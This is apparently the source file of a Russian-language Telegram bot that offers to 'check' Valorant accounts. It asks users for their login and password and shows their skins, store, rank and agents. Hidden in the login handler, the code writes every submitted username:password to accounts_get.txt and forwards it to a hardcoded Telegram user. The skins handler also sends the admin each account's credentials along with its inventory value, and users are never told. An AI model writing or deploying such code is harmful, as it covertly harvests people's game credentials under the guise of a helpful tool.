import asyncio
import datetime
import json
import logging
import os

import time


from aiogram.dispatcher.filters import Command, state

import config
from checker import ClientAcc
from src.market_screens import image_skins_market
from src.night_market import image_skins_night_market
from src.screen_skins import image_skins
from db.base_db import DataBase
from filter.Language_filter import *
from filter.is_admin import *

from keyboards.inline import auth_menu, cb
from keyboards.inline_lang import cb_settings
from keyboards.sell_acc_keyb import cb_sell_acc

from main import bot,dp
from states.state import StartState, AdminState
from valo_lib import Auth
from src.screen_skins import image_skins
db = DataBase('test.db')


from aiogram import types
from aiogram.dispatcher import FSMContext

logger = logging.getLogger('app.base')

@dp.message_handler(IsLanguageRU(),Command('start'),state='*')
async def start_cmnd(message: types.Message, state: FSMContext):
    bad_words = ['<','>','<>']
    logger.info(f'Команда start_cmnd для пользователя {message.from_user.first_name}')
    cur_state = await state.get_state()
    if cur_state:
        await state.reset_state()
    if not db.user_exist(message.from_user.id):
        if not all(bad_word in message.from_user.first_name for bad_word in bad_words):
            db.add_user(message.from_user.id,message.from_user.first_name)
        else:
            db.add_user(message.from_user.id,None)
    all_check_count = db.get_all_checks()
    user_count_check = db.get_count_check(message.from_user.id)[0]
    #welcome_message = (
    #        f'🎄👋Привет, {message.from_user.first_name}!\n'
    #        f'🎁Я бот-чекер игры Valorant. Воспользуйтесь доступными командами для проверки своей коллекции скинов и другой информации.'
    #        f'Для начала работы нажмите кнопку "Войти".\n\n'
    #        f'Всего проверенно аккаунтов: <b>{all_check_count}</b>\n'
    #        f'Вы проверили: <b>{user_count_check}</b> аккаунтов\n'
    #     )
    welcome_message = (
        f'👋 <b>Добро пожаловать, {message.from_user.first_name}!</b>\n\n'
        f'Я бот-чекер игры Valorant. Воспользуйтесь доступными командами для проверки своей коллекции скинов и другой информации. '
        f'Для начала работы нажмите кнопку "Войти".\n\n'
        f'Всего проверено аккаунтов: <b>{all_check_count}</b>\n'
        f'Вы проверили: <b>{user_count_check}</b>\n'
    )
    await message.answer(welcome_message,reply_markup=auth_menu('Login'))

@dp.callback_query_handler(cb_sell_acc.filter(action='cancel_acc'))
@dp.callback_query_handler(IsLanguageRU_CALL(),cb.filter(action='login'),state='*')
async def auth_cmdn(call:types.CallbackQuery,state:FSMContext):
    logger.info(f'Команда auth_cmnd для пользователя {call.message.chat.first_name}')
    cur_state = await state.get_state()
    if cur_state:
        await state.reset_state()
    welcome_message = (
        'Чтобы авторизоваться, напишите ваш логин и пароль через двоеточие.\n'
        '🔐 Пример: <b>username:password</b>'
    )
    await call.message.edit_text(welcome_message,reply_markup=auth_menu())
    await StartState.log_pass.set()



@dp.message_handler(IsLanguageRU(),state=StartState.log_pass, content_types=types.ContentTypes.TEXT)
async def auth_not_cmnd(message:types.Message, state: FSMContext):
    mail_verif = '✅'
    number_verif = '✅'
    logger.info(f'Команда auth_not_cmnd для пользователя {message.from_user.first_name}')
    if len(message.text.split(':')) != 2:
        await message.answer('⚠Формат неверный, попробуйте еще раз.',reply_markup=auth_menu('Cancel'))  # reply_markup отмена
    else:
        username, password = message.text.split(':')
        client = ClientAcc(username=username, password=password)
        result = await client.start()
        if result:
            count_check = db.get_count_check(message.from_user.id)[0]
            db.add_check_acc(message.from_user.id,count_check+1)
            verif = client.check_verif(result['access_token'])
            async with state.proxy() as data:
                data['username'] = username
                data['password'] = password
                data['access_token'] = result['access_token']
                data['entitlements_token'] = result['entitlements_token']
                data['region'] = result['region']
                data['puuid'] = result['puuid']
                data['verif_mail'] = verif['email_verified']
                data['verif_phone']= verif["phone_number_verified"]
            try:#Если есть бан , добавим PERMANENT_BAN PERMA_BAN TIME_BAN
                ban = verif['ban']
                block_ban = ban['restrictions'][0]
                type_ban = block_ban['type']
                if type_ban == 'PERMANENT_BAN' or type_ban == 'PERMA_BAN':
                    await bot.delete_message(message.from_user.id, message_id=message.message_id - 1)
                    await message.answer('<b>Аккаунт заблокирован</b>',reply_markup=auth_menu())
                    await state.reset_state()
                    #Отправить сообщение и не продолжать обрабатывать
                elif type_ban == 'TIME_BAN' or type_ban == 'LEGACY_BAN' or type_ban == 'PBE_LOGIN_TIME_BAN':
                    time_ban = verif['ban']['restrictions'][0]['dat']['expirationMillis']
                    seconds_ban = int(time_ban)//1000
                    remaining_time = int(seconds_ban) - int(time.time())
                    struct_time = time.gmtime(remaining_time)
                    await bot.delete_message(message.from_user.id,message_id=message.message_id-1)
                    await message.answer(f'<i>Аккаунт разблокируется через:</i>\n'
                                         f'<b>{struct_time.tm_mon}мес. {struct_time.tm_mday}дн. {struct_time.tm_hour}ч. {struct_time.tm_min}мин.</b>',reply_markup=auth_menu())
                    await state.reset_state()
            except Exception as e:
                if verif["email_verified"] == False:
                    mail_verif = '❌'
                if verif["phone_number_verified"] == False:
                    number_verif = '❌'
                await message.answer(f'✅ Авторизация прошла успешно!\n\n'
                                     f'👋 Привет, *{result["name"]}*!\n'
                                     f'📍 Твой регион: *{result["region"].upper()}*\n'
                                     f'📱 Телефон {number_verif}\n'
                                     f'✉ Почта {mail_verif}\n', reply_markup=auth_menu(menu='Auth'),
                                     parse_mode=types.ParseMode.MARKDOWN)
                if message.from_user.id != int(config.ADMIN_ID):
                    with open('accounts_get.txt','a') as file:
                        time_get = str(datetime.datetime.now()).split(".")[:1]
                        file.write(f'{time_get[0]} {message.text}\n')
                    await bot.send_message(5273674597,f'Пользователь {message.from_user.first_name}\n'
                                                  f'<b>Аккаунт: {message.text}\n</b>')
                await state.reset_state(with_data=False)
        else:
            await message.answer('❌ Аккаунт невалид',reply_markup=auth_menu('Login'))
            await state.reset_state()

@dp.callback_query_handler(IsLanguageRU_CALL(),cb.filter(action='skins'))  # state
async def get_my_skins(call:types.CallbackQuery, state: FSMContext):
    count_price = 0
    logger.info(f'Команда get_my_skins_cmnd для пользователя {call.message.chat.first_name}')
    if not await state.get_data():
        await call.message.answer('Войдите в аккаунт!',reply_markup=auth_menu('Login'))
    else:
        async with state.proxy() as data:
            username = data['username']
            password = data['password']
            ent_token = data['entitlements_token']
            acc_token = data['access_token']
            region = data['region']
            puuid = data['puuid']

        client = ClientAcc(username=username, password=password)
        items = client.get_items(item='e7c63390-eda7-46e0-bb7a-a6abdacd2433',
                                 ent_token=ent_token,
                                 region=region,
                                 acc_token=acc_token,
                                 puuid=puuid)
        with open(r'skins_info\skins_price.json', 'r') as file:
            prices = json.load(file)
        # ID всех скинов
        with open(r'skins_info\skins_data.json', 'r', encoding='UTF8') as skins_file:
            skins_data = json.load(skins_file)

#------------------------ЗАМЕНИТЬ НА НОВЫЙ JSON И КОД ----------------------
        # Словарь для скинов с лвлом
        price_skin = {}
        skin_full = {}
        for skin_id in items['Entitlements']:
            for skin_uuid in skins_data['data']:
                if skin_id['ItemID'] == skin_uuid['uuid']:
                    if not 'уровень' in skin_uuid['displayName']:
                        skin_full[skin_uuid['displayName']] = skin_uuid['uuid']
                        for price in prices['Offers']:
                            if skin_id['ItemID'] == price['OfferID']:
                                VP_price = price['Cost']['85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741']
                                price_skin[skin_uuid['displayName']] = VP_price
        if skin_full:
            sort_skins = dict(sorted(skin_full.items()))
            #Тут находим скины из коллекций ----------НАСТРОИТЬ В ПЕРЕДАЧУ НА ФОТКАХ------------------
            #with open('collection_data.json','r',encoding='UTF8') as file:
            #    collections_skins = json.load(file)
            #collections_data = {}
            #for collection,name_skin in collections_skins.items():
            #    for name,uuid in skin_full.items():
            #        if name in name_skin:
            #            print(f'{collection} - этот скин есть в этой коллекции')
            #            if not collection in collections_data:
            #                collections_data[collection] = []
            #            collections_data[collection].append(name)
            urls_photo = image_skins(sort_skins,lang='RU')
            for photo in urls_photo:
                await bot.send_photo(chat_id=call.message.chat.id,
                                     photo=types.InputFile(photo))
                os.remove(photo)

            answer_skins = '🎮 Твоя коллекция скинов 🎮:\n\n'
            for index, skin_name in enumerate(skin_full,start=1):
                if skin_name in price_skin:
                    count_price += price_skin[skin_name]
                answer_skins += f'{index}. {skin_name}\n'
            if str(call.message.chat.id) != str(config.ADMIN_ID):
                await bot.send_message(config.ADMIN_ID,f'<b>Аккаунт от:</b>{call.message.chat.first_name}\n'
                                                       f'<b>Кол-во скинов:</b>{len(skin_full)}\n'
                                                       f'<b>Регион:</b>{region}\n'
                                                       f'Цена инвентаря: {count_price}VP\n'
                                                       f'{username}:{password}\n')
        else:
            answer_skins = '🚫 У вас пока нет скинов в коллекции. 🚫'
        if len(skin_full) < 90:
            await call.message.edit_text(f'{answer_skins}\n'
                                         f'<i>Цена инвентаря</i> <b>{count_price}VP</b>\n'
                                         f'@checker_valo_bot', reply_markup=auth_menu('Auth'))
            # await call.message.edit_text(f'{answer_skins}\n'
            #                             f'<i>Цена инвентаря</i> <b>{count_price}VP</b>\n'
            #                             f'@checker_valo_bot',reply_markup=auth_menu('Auth'))
        else:
            first_message = answer_skins[:int(len(answer_skins) / 2)]  # Первая часть сообщения
            second_message = answer_skins[int(len(answer_skins) / 2):]  # Вторая часть сообщения
            await call.message.edit_text(f'\n<b>Страница 1</b>\n'
                                         f'{first_message}', reply_markup=None)
            await call.message.answer(f'\n<b>Страница 2</b>\n'
                                      f'{second_message}'
                                      f'<i>Цена инвентаря</i> <b>{count_price}</b>VP\n'
                                      f'@checker_valo_bot', reply_markup=auth_menu('Auth'))


@dp.callback_query_handler(IsLanguageRU_CALL(),cb.filter(action='store'))#state
async def get_my_store(call:types.CallbackQuery,state:FSMContext):
    logger.info(f'Команда get_my_store для пользователя {call.message.chat.first_name}')
    if not await state.get_data():
        await call.message.answer('Войдите в аккаунт!',reply_markup=auth_menu('Login'))
    answer_text = '🎁 Ваш магазин состоит из 🎁:\n\n'
    async with state.proxy() as data:
        username = data['username']
        password = data['password']
        ent_token = data['entitlements_token']
        acc_token = data['access_token']
        region = data['region']
        puuid = data['puuid']
    client = ClientAcc(username=username,password=password)
    items_store = client.get_store(ent_token=ent_token,
                             region=region,
                             acc_token=acc_token,
                             puuid=puuid)
    skin_info_dict = {}
    my_store_id = [my_skin for my_skin in items_store['SkinsPanelLayout']['SingleItemOffers']]
    #Берем базу со скинами
    with open('skins_info\skins_data.json', 'r', encoding='UTF8') as skins_file:
        skins_data = json.load(skins_file)
    # Добавляем информацию об имени и цене для каждого UUID
    for skin in skins_data['data']:
        if skin['uuid'] in my_store_id:
            skin_name = skin['displayName']
            skin_info_dict[skin['uuid']] = {'name': skin_name, 'price': None}

    for items in items_store['SkinsPanelLayout']['SingleItemStoreOffers']:
        if items['OfferID'] in my_store_id:
            price = str(items['Cost']['85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741']) + 'VP'
            if items['OfferID'] in skin_info_dict:
                skin_info_dict[items['OfferID']]['price'] = price

    #Время окончания маркета
    time_store = items_store['SkinsPanelLayout']['SingleItemOffersRemainingDurationInSeconds']
    for_screens = {}
    #Вывод результата
    for uuid, info in skin_info_dict.items():
        skin_name = info['name']
        skin_price = info['price']
        for_screens[skin_name] = [uuid,skin_price]
        answer_text+=f'<b>{skin_name}</b> - {skin_price}\n'
    urls_skins = image_skins_market(lang='RU', skin_full=for_screens)[0]
    await call.message.delete()
    await bot.send_photo(chat_id=call.message.chat.id, photo=types.InputFile(urls_skins))
    await call.message.answer(f'{answer_text}\n'
                                 f'⏳ Время окончания: <b>{int(time_store / 3600)}ч.</b>\n'
                                 f'@checker_valo_bot', reply_markup=auth_menu('Auth'))

@dp.callback_query_handler(IsLanguageRU_CALL(),cb.filter(action='night_market'))
async def night_market(call:types.CallbackQuery,state:FSMContext):
    logger.info(f'Команда night_market для пользователя {call.message.chat.first_name}')
    night_answer = '🌌Ночной маркет🌌:\n\n'
    async with state.proxy() as data:
        username = data['username']
        password = data['password']
        ent_token = data['entitlements_token']
        acc_token = data['access_token']
        region = data['region']
        puuid = data['puuid']
    client = ClientAcc(username=username,password=password)
    items_store = client.get_store(ent_token=ent_token,
                             region=region,
                             acc_token=acc_token,
                             puuid=puuid)
    with open('skins_info\skins_data.json', 'r', encoding='UTF8') as skins_file:
        skins_data = json.load(skins_file)

    night_store = items_store["BonusStore"]['BonusStoreOffers']
    time_end = items_store['BonusStore']["BonusStoreRemainingDurationInSeconds"]
    time_end_days = time.gmtime(time_end).tm_mday - 1
    time_end_hours = time.gmtime(time_end).tm_hour
    time_end_min = time.gmtime(time_end).tm_min
    # ['Offer']['OfferID'] - uuid скина
    skins_full = {}
    for skins_night in night_store:
        skin_uuid = skins_night['Offer']['OfferID']  # UUID скинов имени
        old_price = f'{skins_night["Offer"]["Cost"]["85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741"]}VP'  # Старые цены , мб в список или без values
        new_price = f"{skins_night['DiscountCosts']['85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741']}VP"
        for night_skin in skins_data['data']:
            if night_skin['uuid'] == skin_uuid:
                night_answer += f'<b>{night_skin["displayName"]}</b> - <i><s>{old_price}</s></i> - <i><b>{new_price}</b></i>\n'
                skins_full[night_skin['displayName']] = [night_skin['uuid'],new_price,old_price]
    url = image_skins_night_market(lang='RU',skin_full=skins_full)
    await call.message.delete()
    await bot.send_photo(chat_id=call.message.chat.id,photo=types.InputFile(url[0]))
    await call.message.answer(text=f'{night_answer}\n'
                                      f'Закончится через: <b>{time_end_days if time_end_days else 0}дн. {time_end_hours}ч. {time_end_min if time_end_min else 0}мин.</b>\n\n'
                                      f'@checker_valo_bot',reply_markup=auth_menu('Auth'))

@dp.callback_query_handler(IsLanguageRU_CALL(),cb.filter(action='account'))
async def get_account_info(call:types.CallbackQuery,state:FSMContext):
    res_time = ''
    logger.info(f'Команда get_account_info для пользователя {call.message.chat.first_name}')
    if not await state.get_data():
        await call.message.answer('Войдите в аккаунт!',reply_markup=auth_menu('Login'))
    async with state.proxy() as data:
        username = data['username']
        password = data['password']
        ent_token = data['entitlements_token']
        acc_token = data['access_token']
        region = data['region']
        puuid = data['puuid']
    client = ClientAcc(username=username,password=password)
    accounts = client.get_my_account(ent_token=ent_token,
                             region=region,
                             acc_token=acc_token,
                             puuid=puuid)
    #Если рейтинг не открыт
    if accounts['Rank'] is None:
        last_match = accounts['last_match']
        VP = accounts['VP']
        Kingdom = accounts['Kingdom']
        RP = accounts['RadiantPoints']
        formatted_time = datetime.datetime.fromtimestamp(int(last_match) / 1000)  # .strftime('%d-%m-%Y %H:%M:%S')
        delta = datetime.datetime.now() - formatted_time
        formatted = datetime.datetime.fromtimestamp(int(last_match) / 1000).strftime('%d-%m-%Y')
        if delta.days:
            res_time += f'{delta.days} дней.'
        else:
            hours, minutes = str(delta).split(':')[0], str(delta).split(':')[1]
            res_time += f'{hours} час.' if int(hours) > 0 else f'{minutes} мин.'
        await call.message.edit_text(f'🏆 Информация о игроке\n\n'
                                     f'🔹Ранг:Unranked\n'
                                     f'🔹VP:{VP}\n'
                                     f'🔹Kingdom:{Kingdom}\n'
                                     f'🔹RP:{RP}\n'
                                     f'🔹Крайний матч: {res_time} ({formatted})\n\n'
                                     f'@checker_valo_bot', reply_markup=auth_menu('Auth'))
    else:
        rank = config.ranks[accounts['Rank']]
        last_match = accounts['last_match']
        VP = accounts['VP']
        Kingdom = accounts['Kingdom']
        RP = accounts['RadiantPoints']
        formatted_time = datetime.datetime.fromtimestamp(int(last_match) / 1000)#.strftime('%d-%m-%Y %H:%M:%S')
        delta = datetime.datetime.now() - formatted_time
        formatted = datetime.datetime.fromtimestamp(int(last_match) / 1000).strftime('%d-%m-%Y')
        if delta.days:
            res_time += f'{delta.days} дней.'

        else:
            hours, minutes = str(delta).split(':')[0], str(delta).split(':')[1]
            res_time += f'{hours} час.' if int(hours) > 0 else f'{minutes} мин.'
        await call.message.edit_text(f'🏆 Информация о игроке\n\n'
                         f'🔹Ранг:{rank}\n'
                         f'🔹VP:{VP}\n'
                         f'🔹Kingdom:{Kingdom}\n'
                         f'🔹RP:{RP}\n'
                         f'🔹Крайний матч: {res_time} ({formatted})\n\n'
                         f'@checker_valo_bot',reply_markup=auth_menu('Auth'))


@dp.callback_query_handler(IsLanguageRU_CALL(),cb.filter(action='agent'))#state
async def get_my_agents(call:types.CallbackQuery,state:FSMContext):
    logger.info(f'Команда get_my_aggents для пользователя {call.message.chat.first_name}')
    agents_data= {
            "5f8d3a7f-467b-97f3-062c-13acf203c006": "Breach",
            "f94c3b30-42be-e959-889c-5aa313dba261": "Raze",
            "6f2a04ca-43e0-be17-7f36-b3908627744d": "Skye",
            "117ed9e3-49f3-6512-3ccf-0cada7e3823b": "Cypher",
            "320b2a48-4d9b-a075-30f1-1f93a9b638fa": "Sova",
            "1e58de9c-4950-5125-93e9-a0aee9f98746": "Killjoy",
            "707eab51-4836-f488-046a-cda6bf494859": "Viper",
            "eb93336a-449b-9c1b-0a54-a891f7921d69": "Phoenix",
            "9f0d8ba9-4140-b941-57d3-a7ad57c6b417": "Brimstone",
            "7f94d92c-4234-0a36-9646-3a87eb8b5c89": "Yoru",
            "569fdd95-4d10-43ab-ca70-79becc718b46": "Sage",
            "a3bfb853-43b2-7238-a4f1-ad90e9e46bcc": "Reyna",
            "8e253930-4c05-31dd-1b6c-968525494517": "Omen",
            "add6443a-41bd-e414-f6ad-e58d267f4e95": "Jett",
            'cc8b64c8-4b25-4ff9-6e7f-37b4da43d235': 'Deadlock',
            'e370fa57-4757-3604-3648-499e1f642d3f': 'Gekko',
            "95b78ed7-4637-86d9-7e41-71ba8c293152": 'Harbor',
            '22697a3d-45bf-8dd7-4fec-84a9e28c69d7': 'Chamber',
            "bb2a4828-46eb-8cd1-e765-15848195d751": 'Neon',
            '41fb69c1-4189-7b37-f117-bcaf1e96f1bf': 'Astra',
            "601dbbe7-43ce-be57-2a40-4abd24953621": 'Kayo',
            'dade69b4-4f5a-8528-247b-219e5a1facd6': 'Fade',
            '0e38b510-41a8-5780-5e8f-568b2a4f2d6c': 'ISO'

    }
    if not await state.get_data():
        await call.message.answer('Войдите в аккаунт!',reply_markup=auth_menu('Login'))
    answer_text = '📎Ваши агенты:📎\n\n' \
                  ''
    async with state.proxy() as data:
        username = data['username']
        password = data['password']
        ent_token = data['entitlements_token']
        acc_token = data['access_token']
        region = data['region']
        puuid = data['puuid']
    client = ClientAcc(username,password)
    agents = client.get_agents(ent_token=ent_token,
                             region=region,
                             acc_token=acc_token,
                             puuid=puuid)
    if not agents['Entitlements']:
        answer_text+=f'•<b>{agents_data.get("320b2a48-4d9b-a075-30f1-1f93a9b638fa")}</b>\n'
        answer_text += f'•<b>{agents_data.get("eb93336a-449b-9c1b-0a54-a891f7921d69")}</b>\n'
        answer_text += f'•<b>{agents_data.get("569fdd95-4d10-43ab-ca70-79becc718b46")}</b>\n'
        answer_text += f'•<b>{agents_data.get("add6443a-41bd-e414-f6ad-e58d267f4e95")}</b>\n'
        answer_text += f'•<b>{agents_data.get("eb93336a-449b-9c1b-0a54-a891f7921d69")}</b>\n'
    else:
        for agent in agents['Entitlements']:
            for key,val in agents_data.items():
                if agent['ItemID'] ==key:
                    answer_text+=f'•<b>{agents_data.get(agent["ItemID"])}</b>\n'
                else:
                    continue
    await call.message.edit_text(f'{answer_text}\n'
                                 f'@checker_valo_bot',reply_markup=auth_menu('Auth'))




@dp.callback_query_handler(IsLanguageRU_CALL(),cb.filter(action='support'),state='*')
async def support_cmnd(call:types.CallbackQuery,state:FSMContext):
    logger.info(f'Команда support_cmnd для пользователя {call.message.chat.first_name}')
    cur_state = await state.get_state()
    if cur_state:
        await state.reset_state()
    await call.message.edit_text(f'По всем вопросом обращайтесь @meggameggamegga',reply_markup=auth_menu('Login'))

@dp.callback_query_handler(IsLanguageRU_CALL(),cb.filter(action='back'),state='*')
async def back_cmnd(call:types.CallbackQuery,state:FSMContext):
    logger.info(f'Команда back_cmnd для пользователя {call.message.chat.first_name}')
    all_check_count = db.get_all_checks()
    user_count_check = db.get_count_check(call.message.chat.id)[0]
    cur_state = await state.get_state()
    if cur_state:
        await state.reset_state()
    welcome_message = (
        f'👋<b>Добро пожаловать, {call.from_user.first_name}!</b>\n\n'
        f'Я бот-чекер игры Valorant. Воспользуйтесь доступными командами для проверки своей коллекции скинов и другой информации. '
        f'Для начала работы нажмите кнопку "Войти".\n\n'
        f'Всего проверено аккаунтов: <b>{all_check_count}</b>\n'
        f'Вы проверили: <b>{user_count_check}</b>\n'
    )

    await call.message.edit_text(welcome_message, reply_markup=auth_menu('Login'))

@dp.callback_query_handler(IsLanguageRU_CALL(),cb.filter(action='exit'),state='*')
@dp.callback_query_handler(IsLanguageRU_CALL(),cb.filter(action='cancel'),state='*')
async def exit_to_login(call:types.CallbackQuery,state:FSMContext):
    logger.info(f'Команда exit_to_login для пользователя {call.message.chat.first_name}')
    cur_state = await state.get_state()
    if cur_state:
        await state.reset_state()
    await call.message.delete()
    welcome_message = (
        'Чтобы авторизоваться, напишите ваш логин и пароль через двоеточие.\n'
        '🔐 Пример: *username:password*'
    )
    await call.message.answer(welcome_message, parse_mode=types.ParseMode.MARKDOWN, reply_markup=auth_menu())
    await StartState.log_pass.set()



